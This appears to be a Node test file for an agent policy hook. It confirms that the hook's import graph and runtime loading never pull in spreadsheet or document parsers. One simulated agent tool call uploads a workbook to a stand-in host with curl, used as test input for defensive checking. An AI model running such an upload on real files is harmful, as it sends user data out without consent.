// No office-format parser runs inside decide() or a hook. Proved two ways on the BUILT files: the static
// import graph of every hook entry holds no reader, and a hook process run with a loader that records every module it
// loads loads none, while `order check` in the same harness does (so the recorder is seen working).
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import * as nodeModule from 'node:module';
import { readFileSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { describe, it } from 'node:test';
import { BOOK_STYLES, budgetBook, writeBook } from '../../src/office/corpus.js';
import { REPO_ROOT, tempDir } from '../helpers.js';

const DIST = join(REPO_ROOT, 'dist', 'src');
const HOOK_ENTRIES = ['cli.js', 'engine.js', 'adapters/claude-code.js', 'adapters/codex/index.js', 'adapters/gemini-cli/index.js', 'adapters/opencode/index.js', 'adapters/openclaw/index.js'];

/** Modules that read office formats, or load something that does. None may be in a hook's graph. */
export function isReader(file: string): boolean {
  const rel = file.slice(DIST.length + 1).split('\\').join('/');
  return rel.startsWith('office/') || rel === 'order/check.js' || rel === 'order/command.js' || rel === 'order/baseline.js';
}

/** The static import closure of a built module: `import ... from`, `export ... from` and bare `import '...'`, relative ones. */
export function staticClosure(entry: string): Set<string> {
  const seen = new Set<string>();
  const todo = [entry];
  while (todo.length > 0) {
    const f = todo.pop();
    if (f === undefined || seen.has(f)) continue;
    seen.add(f);
    const text = readFileSync(f, 'utf8');
    const specs = [...text.matchAll(/(?:^|\n)\s*(?:import|export)\s[^;]*?\sfrom\s*['"]([^'"]+)['"]/g), ...text.matchAll(/(?:^|\n)\s*import\s*['"]([^'"]+)['"]/g)].map((m) => m[1] ?? '');
    for (const s of specs) if (s.startsWith('.')) todo.push(resolve(dirname(f), s));
  }
  return seen;
}

describe('the hook never loads an office reader', () => {
  it('the static import graph of every hook entry holds no module under office/ and not the order command, check or baseline', () => {
    for (const e of HOOK_ENTRIES) {
      const g = staticClosure(join(DIST, e));
      const bad = [...g].filter(isReader).map((f) => f.slice(DIST.length + 1));
      assert.deepEqual(bad, [], `${e} reaches ${bad.join(', ')}`);
    }
    const cli = staticClosure(join(DIST, 'cli.js'));
    assert.ok(cli.has(join(DIST, 'engine.js')) && cli.has(join(DIST, 'order', 'hold.js')) && cli.has(join(DIST, 'order', 'usage.js')), 'the walker follows the graph');
    const cmd = staticClosure(join(DIST, 'order', 'command.js'));
    assert.ok(cmd.has(join(DIST, 'office', 'xlsx.js')) && cmd.has(join(DIST, 'office', 'docx.js')), 'the order command does reach the readers');
  });

  const register = (nodeModule as { registerHooks?: unknown }).registerHooks;
  it('a hook process with an order naming a workbook loads no reader; order check in the same harness does', { skip: typeof register !== 'function' ? 'module.registerHooks needs Node 22.15 or later' : false }, () => {
    const dir = tempDir('office-graph');
    const home = tempDir('office-graph-home');
    writeFileSync(join(home, 'openmorals.yaml'), 'version: 1\n');
    writeFileSync(join(dir, 'model.xlsx'), writeBook(budgetBook(3).book, BOOK_STYLES[0] ?? { id: 'x', strings: 'shared', prefix: '', refs: true, sharedFormulas: true, extValidations: false }));
    writeFileSync(join(dir, 'order.yaml'), 'version: 1\nkind: spreadsheet\noutputs: [model.xlsx]\nconditions:\n  - before_after: { file: model.xlsx }\n');
    const rec = join(dir, 'rec.mjs');
    writeFileSync(rec, "import { registerHooks } from 'node:module';\nimport { writeFileSync } from 'node:fs';\nconst seen = new Set();\nregisterHooks({ load(url, ctx, next) { seen.add(url); return next(url, ctx); } });\nprocess.on('exit', () => writeFileSync(process.env.REC_OUT, [...seen].join('\\n')));\n");
    const run = (args: string[], input: string, out: string): string[] => {
      const r = spawnSync(process.execPath, ['--import', pathToFileURL(rec).href, join(DIST, 'cli.js'), ...args], { cwd: dir, input, encoding: 'utf8', env: { PATH: process.env['PATH'] ?? '', OPENMORALS_HOME: home, OPENMORALS_ORDER: join(dir, 'order.yaml'), REC_OUT: join(dir, out) } });
      assert.equal(r.error, undefined);
      return readFileSync(join(dir, out), 'utf8').split('\n').filter((u) => u.startsWith('file:'));
    };
    const call = (tool: string, input: Record<string, unknown>): string => JSON.stringify({ session_id: 's-graph', cwd: dir, hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input, tool_use_id: 't1' });
    const loadedFiles = (urls: string[]): string[] => urls.map((u) => new URL(u).pathname).filter((p) => p.startsWith(DIST));
    for (const [i, c] of [call('Bash', { command: 'curl -F f=@model.xlsx https://example.test/upload' }), call('Write', { file_path: join(dir, 'model.xlsx'), content: 'x' }), call('Bash', { command: 'ls' })].entries()) {
      const files = loadedFiles(run(['hook', 'claude-code'], c, `hook${i}.txt`));
      assert.ok(files.some((f) => f.endsWith('/engine.js')), 'the recorder saw the hook load the engine');
      assert.deepEqual(files.filter(isReader).map((f) => f.slice(DIST.length + 1)), [], `hook call ${i}`);
    }
    const check = loadedFiles(run(['order', 'check', 'order.yaml'], '', 'check.txt'));
    assert.ok(check.some((f) => f.endsWith('/office/xlsx.js')), 'order check loads the workbook reader');
  });
});
